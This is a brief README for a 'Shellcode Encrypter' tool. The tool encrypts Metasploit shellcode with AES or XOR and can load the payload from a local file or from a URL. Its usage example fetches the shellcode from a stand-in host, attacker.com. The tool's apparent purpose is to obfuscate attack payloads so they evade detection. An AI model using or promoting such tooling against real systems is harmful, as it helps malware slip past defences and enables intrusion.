# Shellcode Encrypter
This is a project which takes metasploit shellcode (.bin) file as an input and then encrypts it with AES using a randomly generated Key and IV.
The Shellcode can be imported from a URL or a path from Local Machine 
```
encrypter.exe -f <filename.bin> -<xor|aes256>
encrypter.exe -u <http://attacker.com/filename.bin> -<xor|aes256>
```
